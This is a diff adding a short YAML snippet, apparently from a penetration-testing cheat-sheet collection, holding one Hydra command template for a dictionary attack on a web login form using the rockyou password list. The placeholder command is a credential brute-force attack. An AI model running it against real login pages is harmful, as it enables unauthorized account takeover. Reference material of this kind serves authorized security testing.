@@ -1,0 +1,8 @@
+metadata:
+  filename: "hydra-dictionary-http-post-form.yaml"
+  tags: ["web", "api"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/<login_page.php>:<post_body_user>=<user>&<post_body_pass>=^<pass>^:<string_identifying_failed_login>"
